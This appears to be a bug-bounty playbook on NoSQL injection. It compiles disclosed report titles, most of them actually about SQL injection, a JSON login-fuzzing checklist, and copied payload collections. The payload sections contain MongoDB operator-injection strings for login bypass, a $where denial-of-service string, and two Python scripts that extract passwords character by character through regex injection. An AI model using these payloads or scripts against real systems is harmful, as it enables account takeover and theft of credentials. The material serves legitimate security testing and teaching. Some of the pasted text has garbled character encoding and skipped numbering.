# Real-World Playbook — NoSQL Injection

**Class:** `nosqli` · **Coverage-matrix tier:** 1 · **Hunter2:** /nosqli · tools/nosqli_scanner.py · **Skill:** web2-vuln-classes
**Sources:** [reddelexc/hackerone-reports](https://github.com/reddelexc/hackerone-reports) (disclosed reports) · [Az0x7/vulnerability-Checklist](https://github.com/Az0x7/vulnerability-Checklist) (test flow) · [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) + [payloadbox](https://github.com/payloadbox) (payloads) · [OWASP WSTG](https://github.com/OWASP/wstg) + [HowToHunt](https://github.com/KathanP19/HowToHunt) + [AllAboutBugBounty](https://github.com/daffainfo/AllAboutBugBounty) + [HackTricks](https://github.com/HackTricks-wiki/hacktricks) (method)

## Why it pays (real bounty signal)
Top disclosed NoSQL Injection reports peak at **$25,000**. Rewarded across: Eternal, GitHub Security Lab, Grab, Internet Bug Bounty, Mail.ru, Razer, Uber, Valve.

## How real hackers found it — top disclosed reports
*(title = the actual technique; open the report for the full PoC)*

- **SQL Injection in report_xml.php through countryFilter[] parameter** — Valve, $25,000 · 407👍 · [383127](https://hackerone.com/reports/383127)
- **Time-Based SQL injection at city-mobil.ru** — Mail.ru, $15,000 · 631👍 · [868436](https://hackerone.com/reports/868436)
- **SQL injection at fleet.city-mobil.ru** — Mail.ru, $10,000 · 372👍 · [881901](https://hackerone.com/reports/881901)
- **SQL Injection [unauthenticated] with direct output at https://news.mail.ru/** — Mail.ru, $7,500 · 156👍 · [818972](https://hackerone.com/reports/818972)
- **[windows10.hi-tech.mail.ru]  Blind SQL Injection** — Mail.ru, $5,000 · 330👍 · [786044](https://hackerone.com/reports/786044)
- **turboslim.lady.mail.ru - Blind sql-injection.** — Mail.ru, $5,000 · 93👍 · [795291](https://hackerone.com/reports/795291)
- **SQL injection  delivery-club.ru (ClickHouse)** — Mail.ru, $5,000 · 76👍 · [1024773](https://hackerone.com/reports/1024773)
- **[www.zomato.com] SQLi - /php/██████████ - item_id** — Eternal, $4,500 · 326👍 · [403616](https://hackerone.com/reports/403616)
- **www.drivegrab.com SQL injection** — Grab, $4,500 · 203👍 · [273946](https://hackerone.com/reports/273946)
- **C++: Support Pqxx connector to search for sql injections to Postgres** — GitHub Security Lab, $4,500 · 15👍 · [1241583](https://hackerone.com/reports/1241583)
- **CVE-2024-42005: Potential SQL injection in QuerySet.values() and values_list()** — Internet Bug Bounty, $4,263 · 52👍 · [2646493](https://hackerone.com/reports/2646493)
- **Blind SQL injection on id.indrive.com** — inDrive, $4,134 · 199👍 · [2051931](https://hackerone.com/reports/2051931)
- **[api.easy2pay.co]  SQL Injection at fortumo via TransID parameter [Bypassing Signature Validation🔥]** — Razer, $4,000 · 232👍 · [894325](https://hackerone.com/reports/894325)
- **SQL Injection on sctrack.email.uber.com.cn** — Uber, $4,000 · 93👍 · [150156](https://hackerone.com/reports/150156)
- **Blind SQL injection on [city-mobil.ru/taxiserv/] in filter{"id_locality"}** — Mail.ru, $3,500 · 30👍 · [1133083](https://hackerone.com/reports/1133083)
- **Blind SQL Injection on news.mail.ru** — Mail.ru, $3,000 · 52👍 · [732430](https://hackerone.com/reports/732430)
- **SQL injection in Wordpress Plugin Huge IT Video Gallery at https://drive.uber.com/frmarketplace/** — Uber, $3,000 · 39👍 · [125932](https://hackerone.com/reports/125932)
- **SQL injection in 3rd party software Anomali** — Uber, $2,500 · 61👍 · [206872](https://hackerone.com/reports/206872)

## Test flow / checklist — do these in order
*(imported from Az0x7/vulnerability-Checklist; run each, mark result in the coverage matrix)*

97 JSON Tests for for Authentication Endpoints link pdf [link](https://www.linkedin.com/feed/update/urn:li:activity:7097279293608607746/)

1. Basic credentials
```
{
"login": "admin",
"password": "admin"
}
```

2. Empty credentials:
```
{
"login": "",
"password": ""
}
```

3- Null values:
```
{
"login": null,
"password": null
}
```

4. Credentials as numbers:
```
{
"login": 123,
"password": 456
}
```

6. Credentials as booleans:
```
{
"login": true,
"password": false
}
```

7. Credentials as arrays:
```
{
"login": ["admin"],
"password": ["password"]
}
```

8. Credentials as objects:
```
{
"login": {"username": "admin",
"password": {"password": "password"}}
}
```

9. Special characters in credentials:
```
{
"login": "@dm!n",
"password": "p@ssw0rd#"
}
```

10. SQL Injection:
```
{
"login": "admin' --",
"password": "password"
}
```

11. HTML tags in credentials:
```
{
"login": "<h1>admin</h1>",
"password": "ololo-HTML-XSS"
}
```

12. Unicode in credentials:
```
{
"login": "\u0061\u0064\u006D\u0069\u006E",
"password":"\u0070\u0061\u0073\u0073\u0077\u006F\u0072\u0064"
}
```

13. Credentials with escape characters:
```
{
"login": "ad\\nmin",
"password": "pa\\ssword"
}
```

14. Credentials with white space:
```
{
"login": " ",
"password": " "
}
```

15. Overlong values:
```
{
"login": "a"*10000,
"password": "b"*10000
}

```
16. Malformed JSON (missing brace):
```
{
"login": "admin",
"password": "admin"
}
```

17. Malformed JSON (extra comma):
```
{
"login": "admin",
"password": "admin",
}
```

18. Missing login key:
```
{
"password": "admin"
}
```

19. Missing password key:
```
{
"login": "admin"
}
```

20. Swapped key values:
```
{
"admin": "login",
"password": "password"
}
```

21. Extra keys:
```
{
"login": "admin",
"password": "admin",
"extra": "extra"
}
```

22. Missing colon:
```
{
"login" "admin",
"password": "password"
}
```

23. Invalid Boolean as credentials:
```
{
"login": yes,
"password": no
}
```

25. All keys, no values:
```
{
"": "",
"": ""
}
```

26. Nested objects:
```
{
"login": {"innerLogin": "admin",
"password": {"innerPassword": "password"}}
}
```
27. Case sensitivity testing:
```
{
"LOGIN": "admin",
"PASSWORD": "password"
}
```

28. Login as a number, password as a string:
```
{
"login": 1234,
"password": "password"
}
```

29. Login as a string, password as a number:
```
{
"login": "admin",
"password": 1234
}
```

30. Repeated keys:
```
{
"login": "admin",
"login": "user",
"password": "password"
}
```
31. Single quotes instead of double:
```
{
'login': 'admin',
'password': 'password'
}
```
33. Login and password with only special characters:
```
{
"login": "@#$%^&*",
"password": "!@#$%^&*"
}
```
34. Unicode escape sequence:
```
{
"login": "\u0041\u0044\u004D\u0049\u004E",
"password":"\u0050\u0041\u0053\u0053\u0057\u004F\u0052\u0044"
}
```

35. Value as object instead of string:
```
{
"login": {"$oid":
"507c7f79bcf86cd7994f6c0e"},
"password": "password"}
}
```

37. Nonexistent variables as values:
```
{
"login": undefined,
"password": undefined
}
```

38. Extra nested objects:
```
{
"login": "admin",
"password": "password",
"extra": {"key1": "value1",
"key2": "value2"}
}

```

39. Hexadecimal values:
```
{
"login": "0x1234",
"password": "0x5678"
}
```

40. Extra symbols after valid JSON:
```
{
"login": "admin",
"password": "password"}@@@@@@
}
```

41. Only keys, without values:
```
{
"login":,
"password":
}
```

42. Insertion of control characters:
```
{
"login": "ad\u0000min",
"password": "pass\u0000word"
}
```

43. Long Unicode Strings:
```
{
"login": "\u0061"*10000,
"password": "\u0061"*10000
}
```

44. Newline Characters in Strings:
```
{
"login": "ad\nmin",
"password": "pa\nssword"
}
```

45. Tab Characters in Strings:
```
{
"login": "ad\tmin",
"password": "pa\tssword"
}
```

46. Test with HTML content in Strings:
```
{
"login": "<b>admin",
"password": "password"
}
```

47. JSON Injection in Strings:
```
{
"login": "{\"injection\":\"value\"}",
"password": "password"
}
```

48. Test with XML content in Strings:
```
{
"login": "admin",
"password": "password"
}
```

49. Combination of Number, Strings, and Special characters:
```
{
"login": "ad123min!@",
"password": "pa55w0rd!@"
}
```

50. Use of environment variables:
```
{
"login": "${USER}",
"password": "${PASS}"
}
```

51. Backslashes in Strings:
```
{
"login": "ad\\min",
"password": "pa\\ssword"
}
```

52. Long strings of special characters:
```
{
"login": "!@#$%^&*()"*1000,
"password": "!@#$%^&*()"*1000
}
```

53. Empty Key in JSON:
```
{
"": "admin",
"password": "password"
}
```

55. JSON Injection in Key:
```
{
"{\"injection\":\"value\"}
": "admin",
"password": "password"
}
```

56. Quotation marks in strings:
```
{
"login": "\"admin\"",
"password": "\"password\""
}
```

57. Credentials as nested arrays:
```
{
"login": [["admin"]],
"password": [["password"]]
}
```

58. Credentials as nested objects:
```
{
"login": {"username": {"value": "admin",
"password": {"password": {"value":
"password"
}
```

59. Keys as numbers:
```
{
123: "admin",
456: "password"
}
```

60. Testing with greater than and less than signs:
```
{
"login": "admin>1",
"password": "<password"
}
```

61. Testing with parentheses in credentials:
```
{
"login": "(admin)",
"password": "(password)"
}
```

62. Credentials containing slashes:
```
{
"login": "admin/user",
"password": "pass/word"
}
```

63. Credentials containing multiple data types:
```
{
"login": ["admin",
123,
true,
null,
{"username": ["admin"],
"password": ["password",
123,
false,
null,
{"password": "password"]}}
}
```

64. Using escape sequences:
```
{
"login": "admin\\r\\n\\t",
"password": "password\\r\\n\\t"
}
```

65. Using curly braces in strings:
```
{
"login": "{admin}",
"password": "{password}"
}
```

66. Using square brackets in strings:
```
{
"login": "[admin]",
"password": "[password]"
}
```

68. Strings with only special characters:
```
{
"login": "!@#$$%^&*()",
"password": "!@#$$%^&*()"
}
```

69. Strings with control characters:
```
{
"login": "admin\b\f\n\r\t\v\0",
"password": "password\b\f\n\r\t\v\0"
}
```

71. Null characters in strings:
```
{
"login": "admin\0",
"password": "password\0"
}
```

72. Exponential numbers as strings:
```
{
"login": "1e5",
"password": "1e10"
}
```

73. Hexadecimal numbers as strings:
```
{
"login": "0xabc",
"password": "0x123"
}
```

74. Leading zeros in numeric strings:
```
{
"login": "000123",
"password": "000456"
}
```

75. Multilingual input (here, English and Korean):
```
{
"login": "adminê´€ë¦¬ìž",
"password": "passwordë¹„ë°€ë²ˆí˜¸"
}
```
76. Extremely long keys:
```
{
"a"*10000: "admin",
"b"*10000: "password"
}
```

78. Extremely long unicode strings:
```
{
"login": "\u0061"*10000,
"password": "\u0062"*10000
}
```

79. JSON strings with semicolon:
```
{
"login": "admin;",
"password": "password;"
}
```

80. JSON strings with backticks:
```
{
"login": "`admin`",
"password": "`password`"
}
```

81. JSON strings with plus sign:
```
{
"login": "admin+",
"password": "password+"
}
```

82. JSON strings with equal sign:
```
{
"login": "admin=",
"password": "password="
}
```
83. Strings with Asterisk (*) Symbol:
```
{
"login": "admin*",
"password": "password*"
}
```

84. JSON containing JavaScript code:
```
{
"login": "admin<script>alert('hi')</script>",
"password": "password"
}
```

85. Negative numbers as strings:
```
{
"login": "-123",
"password": "-456"
}
```

86. Values as URLs:
```
{
"login": "https://admin.com",
"password": "https://password.com"
}
```

87. Strings with email format:
```
{
"login": "admin@admin.com",
"password": "password@password.com"
}
```
88. Strings with IP address format:
```
{
"login": "192.0.2.0",
"password": "203.0.113.0"
}
```

89. Strings with date format:
```
{
"login": "2023-08-03",
"password": "2023-08-04"
}
```

90. JSON with exponential values:
```
{
"login": 1e+30,
"password": 1e+30
}
```

91. JSON with negative exponential values:
```
{
"login": -1e+30,
"password": -1e+30
}
```

92. Using Zero Width Space (U+200B) in strings:
```
{
"login": "adminâ€‹",
"password": "passwordâ€‹"
}
```

93. Using Zero Width Joiner (U+200D) in strings:
```
{
"login": "adminâ€",
"password": "passwordâ€"
}
```

94. JSON with extremely large numbers:
```
{
"login": 12345678901234567890,
"password": 12345678901234567890
}
```

95. Strings with backspace characters:
```
{
"login": "admin\b",
"password": "password\b"
}
```

96. Test with emoji in strings:
```
{
"login": "adminðŸ˜€",
"password": "passwordðŸ˜€"
}
```

97. JSON with comments, although they are not officially supported in JSON:
```
{
/*"login": "admin",
"password": "password"*/
}
```

98. JSON with base64 encoded values:
```
{
"login": "YWRtaW4=",
"password": "cGFzc3dvcmQ="
}
```

99. Including null byte character (may cause truncation):
```
{
"login": "admin\0",
"password": "password\0"
}
```

100. JSON with credentials in scientific notation:
```
{
"login": 1e100,
"password": 1e100
}
```

102. Strings with octal values:
```
{
"login": "\141\144\155\151\156",
"password":"\160\141\163\163\167\157\162\144"
}
```
103. writeup
```
{
root:{
"username": "admin",
"password":"admin"
}
}
```

104. writeup
```
basic => username=admin
username[]=admin
username[0]=admin
username=admin&username=admin
delete username=admin

```

## Real payloads
*(actual attack strings — adapt to the injection context; fire only where a real sink exists)*

### PayloadsAllTheThings
```
db.products.find({ "price": userInput })
```
```
db.products.find({ "price": { "$gt": 0 } })
```
```
  username[$ne]=toto&password[$ne]=toto
  login[$regex]=a.*&pass[$ne]=lol
  login[$gt]=admin&login[$lt]=test&pass[$ne]=1
  login[$nin][]=admin&login[$nin][]=test&pass[$ne]=toto
```
```
  {"username": {"$ne": null}, "password": {"$ne": null}}
  {"username": {"$ne": "foo"}, "password": {"$ne": "bar"}}
  {"username": {"$gt": undefined}, "password": {"$gt": undefined}}
  {"username": {"$gt":""}, "password": {"$gt":""}}
```
```
username[$ne]=toto&password[$regex]=.{1}
username[$ne]=toto&password[$regex]=.{3}
```
```
  username[$ne]=toto&password[$regex]=m.{2}
  username[$ne]=toto&password[$regex]=md.{1}
  username[$ne]=toto&password[$regex]=mdp

  username[$ne]=toto&password[$regex]=m.*
  username[$ne]=toto&password[$regex]=md.*
```
```
  {"username": {"$eq": "admin"}, "password": {"$regex": "^m" }}
  {"username": {"$eq": "admin"}, "password": {"$regex": "^md" }}
  {"username": {"$eq": "admin"}, "password": {"$regex": "^mdp" }}
```
```
{"username":{"$in":["Admin", "4dm1n", "admin", "root", "administrator"]},"password":{"$gt":""}}
```
```
{"id":"10", "id":"100"} 
```
```
import requests
import urllib3
import string
import urllib
urllib3.disable_warnings()

username="admin"
password=""
u="http://example.org/login"
headers={'content-type': 'application/json'}

while True:
    for c in string.printable:
        if c not in ['*','+','.','?','|']:
            payload='{"username": {"$eq": "%s"}, "password": {"$regex": "^%s" }}' % (username, password + c)
            r = requests.post(u, data = payload, headers = headers, verify = False, allow_redirects = False)
            if 'OK' in r.text or r.status_code == 302:
                print("Found one more char : %s" % (password+c))
                password += c
```
```
import requests
import urllib3
import string
import urllib
urllib3.disable_warnings()

username="admin"
password=""
u="http://example.org/login"
headers={'content-type': 'application/x-www-form-urlencoded'}

while True:
    for c in string.printable:
        if c not in ['*','+','.','?','|','&','$']:
            payload='user=%s&pass[$regex]=^%s&remember=on' % (username, password + c)
            r = requests.post(u, data = payload, headers = headers, verify = False, allow_redirects = False)
            if r.status_code == 302 and r.headers['Location'] == '/dashboard':
                print("Found one more char : %s" % (password+c))
```

## Real attacker flow / methodology
*(how real hunters approach this class step by step)*

### From OWASP WSTG (testing guide)
### NoSQL Injection

#### Summary

NoSQL databases provide looser consistency restrictions than traditional SQL databases. By requiring fewer relational constraints and consistency checks, NoSQL databases often offer performance and scaling benefits. Yet these databases are still potentially vulnerable to injection attacks, even if they aren't using the traditional SQL syntax. Because these NoSQL injection attacks may execute within a [procedural language](https://en.wikipedia.org/wiki/Procedural_programming), rather than in the [declarative SQL language](https://en.wikipedia.org/wiki/Declarative_programming), the potential impacts are greater than traditional SQL injection.

NoSQL database calls are written in the application's programming language, a custom API call, or formatted according to a common convention (such as `XML`, `JSON`, `LINQ`, etc). Malicious input targeting those specifications may not trigger the primarily application sanitization checks. For example, filtering out common HTML special characters such as `< > & ;` will not prevent attacks against a JSON API, where special characters include `/ { } :`.

There are hundreds of NoSQL databases available for use within an application, providing APIs in a variety of languages and relationship models. Each offers different features and restrictions. Because there is not a common language between them, example injection code will not apply across all NoSQL databases. For this reason, anyone testing for NoSQL injection attacks will need to familiarize themselves with the syntax, data model, and underlying programming language in order to craft specific tests.

NoSQL injection attacks may execute in different areas of an application than traditional SQL injection. Where SQL injection would execute within the database engine, NoSQL variants may execute during within the application layer or the database layer, depending on the NoSQL API used and data model. Typically NoSQL injection attacks will execute where the attack string is parsed, evaluated, or concatenated into a NoSQL API call.

Additional timing attacks may be relevant to the lack of concurrency checks within a NoSQL database. These are not covered under injection testing. At the time of writing MongoDB is the most widely used NoSQL database, and so all examples will feature MongoDB APIs.

#### How to Test

##### NoSQL Injection Vulnerabilities in MongoDB

The MongoDB API expects BSON (Binary JSON) calls, and includes a secure BSON query assembly tool. However, according to MongoDB documentation - unserialized JSON and [JavaScript expressions](https://docs.mongodb.org/manual/faq/developers/#javascript) are permitted in several alternative query parameters. The most commonly used API call allowing arbitrary JavaScript input is the `$where` operator.

The MongoDB `$where` operator typically is used as a simple filter or check, as it is within SQL.

`db.myCollection.find( { $where: "this.credits`` ``==`` ``this.debits" } );`

Optionally JavaScript is also evaluated to allow more advanced conditions.

`db.myCollection.find( { $where: function() { return obj.credits - obj.debits < 0; } } );`

##### Example 1

If an attacker were able to manipulate the data passed into the `$where` operator, that attacker could include arbitrary JavaScript to be evaluated as part of the MongoDB query. An example vulnerability is exposed in the following code, if user input is passed directly into the MongoDB query without sanitization.

`db.myCollection.find( { active: true, $where: function() { return obj.credits - obj.debits < $userInput; } } );;`

As with testing other types of injection, one does not need to fully exploit the vulnerability to demonstrate a problem. By injecting special characters relevant to the target API language, and observing the results, a tester can determine if the application correctly sanitized the input. For example within MongoDB, if a string containing any of the following special characters were passed unsanitized, it would trigger a database error.

`' " \ ; { }`

With normal SQL injection, a similar vulnerability would allow an attacker to execute arbitrary SQL commands - exposing or manipulating data at will. However, because JavaScript is a fully featured language, not only does this allow an attacker to manipulate data, but also to run arbitrary code. For example, instead of just causing an error when testing, a full exploit would use the special characters to craft valid JavaScript.

This input `0;var date=new Date(); do{curDate = new Date();}while(curDate-date<10000)` inserted into `$userInput` in the above example code would result in the following JavaScript function being executed. This specific attack string would case the entire MongoDB instance to execute at 100% CPU usage for 10 second.

`function() { return obj.credits - obj.debits < 0;var date=new Date(); do{curDate = new Date();}while(curDate-date<10000); }`

##### Example 2

Even if the input used within queries is completely sanitized or parameterized, there is an alternate path in which one might trigger NoSQL injection. Many NoSQL instances have their own reserved variable names, independent of the application programming language.

For example within MongoDB, the `$where` syntax itself is a reserved query operator. It needs to be passed into the query exactly as shown; any alteration would cause a database error. However, because `$where` is also a valid PHP variable name, it may be possible for an attacker to insert code into the query by creating a PHP variable named `$where`. The PHP MongoDB documentation explicitly warns developers:

> Please make sure that for all special query operators (starting with `$`) you use single quotes so that PHP doesn't try to replace `$exists` with the value of the variable `$exists`.

Even if a query depended on no user input, such as the following example, an attacker could exploit MongoDB by replacing the operator with malicious data.

`db.myCollection.find( { $where: function() { return obj.credits - obj.debits < 0; } } );`

One way to potentially assign data to PHP variables is via HTTP Parameter Pollution (see: [HTTP Parameter pollution](04-HTTP_Parameter_Pollution.md)). By creating a variable named `$where` via parameter pollution, one could trigger a MongoDB error indicating that the query is no longer valid. Any value of `$where` other than the string `$where` itself, should suffice to demonstrate vulnerability. An attacker would develop a full exploit by inserting the following:

`$where: function() { //arbitrary JavaScript here }`


*(truncated — open the source link for the full method)*

### From AllAboutBugBounty
#### NoSQL injection

#### Introduction
NoSQL databases provide looser consistency restrictions than traditional SQL databases. By requiring fewer relational constraints and consistency checks, NoSQL databases often offer performance and scaling benefits. Yet these databases are still potentially vulnerable to injection attacks, even if they aren't using the traditional SQL syntax.

#### How to Exploit
##### Authentication Bypass

Basic authentication bypass using not equal ($ne) or greater ($gt)

```
in the request
- username[$ne]=toto&password[$ne]=toto
- login[$regex]=a.*&pass[$ne]=lol
- login[$gt]=admin&login[$lt]=test&pass[$ne]=1
- login[$nin][]=admin&login[$nin][]=test&pass[$ne]=toto
```

```json
The output is
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$ne": "foo"}, "password": {"$ne": "bar"}}
{"username": {"$gt": undefined}, "password": {"$gt": undefined}}
{"username": {"$gt":""}, "password": {"$gt":""}}
```

##### Extract length information

```json
username[$ne]=toto&password[$regex]=.{1}
username[$ne]=toto&password[$regex]=.{3}
```

##### Extract data information

```json
in URL
username[$ne]=toto&password[$regex]=m.{2}
username[$ne]=toto&password[$regex]=md.{1}
username[$ne]=toto&password[$regex]=mdp

username[$ne]=toto&password[$regex]=m.*
username[$ne]=toto&password[$regex]=md.*

in JSON
{"username": {"$eq": "admin"}, "password": {"$regex": "^m" }}
{"username": {"$eq": "admin"}, "password": {"$regex": "^md" }}
{"username": {"$eq": "admin"}, "password": {"$regex": "^mdp" }}
```

##### Extract data with "in"

```json
{"username":{"$in":["Admin", "4dm1n", "admin", "root", "administrator"]},"password":{"$gt":""}}
```

##### PHP Arbitrary Function Execution
```json
"user":{"$func": "var_dump"}
```

#### Blind NoSQL

##### POST

```python
import requests
import urllib3
import string
import urllib

*(truncated — open the source link for the full method)*

### From HackTricks (excerpt — see [HackTricks](https://github.com/HackTricks-wiki/hacktricks) for full)
### NoSQL injection


#### Exploit

In PHP, a client can submit an array by changing a parameter from _`parameter=foo`_ to _`parameter[arrName]=foo`_.

These payloads inject a database **operator**:<sup>[[1]](#references)</sup><sup>[[2]](#references)</sup>

```bash
username[$ne]=1$password[$ne]=1 #<Not Equals>
username[$regex]=^adm$password[$ne]=1 #Check a <regular expression>, could be used to brute-force a parameter
username[$regex]=.{25}&pass[$ne]=1 #Use the <regex> to find the length of a value
username[$eq]=admin&password[$ne]=1 #<Equals>
username[$ne]=admin&pass[$lt]=s #<Less than>, Brute-force pass[$lt] to find more users
username[$ne]=admin&pass[$gt]=s #<Greater Than>
username[$nin][admin]=admin&username[$nin][test]=test&pass[$ne]=7 #<Matches non of the values of the array> (not test and not admin)
{ $where: "this.credits == this.debits" }#<IF>, can be used to execute code
```

##### Basic authentication bypass


*(truncated — open the source link for the full method)*

## Chaining — always ask "what does this unlock?"
- Operator injection ($ne/$gt) at login → auth bypass → ATO
- $where JS → time-based blind extraction

## Hunter2 wiring
- **Run:** `/nosqli · tools/nosqli_scanner.py`
- **Skill:** `web2-vuln-classes`
- **Coverage-matrix tier:** 1 (Tier 0 = test first)

## What gets this rejected (kill before you write)
*(from the toolkit NEVER-SUBMIT list — match one of these with no chain → KILL IT)*
- Operator injection (`$ne`/`$gt`) that only returns a DB error or type change — no auth bypass, no data out
- Login payload accepted but no session or token actually granted (no real bypass)
- `$where`/`$regex` probe with no rows or characters actually exfiltrated (technically-possible → downgrade, not submit)
- Error message only, WAF-filtered, no data returned
- Reflected error revealing MongoDB with no exploitable sink behind it

**Conditionally valid (only WITH a chain):** `$ne`/`$gt` at login that actually returns a valid authenticated session → auth bypass → ATO; or `$where`/`$regex` blind extraction that pulls real credential/data characters end to end.
